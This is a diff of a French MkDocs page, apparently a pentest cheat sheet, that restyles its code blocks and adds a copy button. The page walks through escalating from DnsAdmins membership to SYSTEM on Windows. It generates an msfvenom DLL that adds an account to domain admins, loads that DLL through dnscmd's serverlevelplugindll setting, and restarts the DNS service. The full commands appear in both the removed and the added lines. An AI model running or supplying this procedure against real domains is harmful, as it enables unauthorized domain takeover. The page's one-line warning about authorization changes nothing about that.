@@ -7723,20 +7723,20 @@
 <p>L'abus de ce privilège peut permettre une élévation de privilèges à <code>NT AUTHORITY\SYSTEM</code>, le niveau de privilège le plus élevé sur un système Windows. C'est parce que le service DNS s'exécute sous ce compte utilisateur.</p>
 <h3 id="generation-du-dll">Génération du .DLL</h3>
 <p>Le premier pas est de générer un fichier DLL qui, lorsqu'il est chargé, exécutera un code arbitraire. Vous pouvez utiliser msfvenom pour cela :</p>
-<pre><code class="language-bash">msfvenom -p windows/x64/exec cmd='net group &quot;domain admins&quot; netadm /add /domain' -f dll -o adduser.dll
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/exec<span class="w"> </span><span class="nv">cmd</span><span class="o">=</span><span class="s1">&#39;net group &quot;domain admins&quot; netadm /add /domain&#39;</span><span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>-o<span class="w"> </span>adduser.dll
+</span></code></pre></div>
 <h3 id="transfert-du-dll-et-injection">Transfert du .DLL et Injection</h3>
 <p>Après avoir transféré le fichier <code>.dll</code> sur la machine cible, utilisez <code>dnscmd.exe</code> pour configurer le serveur DNS afin qu'il charge la DLL :</p>
-<pre><code class="language-powershell">dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">dnscmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">serverlevelplugindll</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">netadm</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">adduser</span><span class="p">.</span><span class="n">dll</span>
+</span></code></pre></div>
 <h3 id="redemarrage-du-service-dns">Redémarrage du service DNS</h3>
 <p>Après avoir configuré la DLL, il vous faudra redémarrer le service DNS pour que la DLL soit chargée et exécutée.</p>
 <p>Pour arrêter le service DNS :</p>
-<pre><code class="language-cmd">sc stop dns
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sc stop dns
+</span></code></pre></div>
 <p>Pour démarrer le service DNS :</p>
-<pre><code class="language-cmd">sc start dns
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sc start dns
+</span></code></pre></div>
 <p><strong>Note de sécurité</strong>: Cette technique est souvent détectée par des solutions EDR (Endpoint Detection and Response) ou des outils de surveillance. Elle ne doit être utilisée qu'avec une autorisation appropriée, dans un environnement contrôlé.</p>
 
 
@@ -7784,7 +7784,7 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
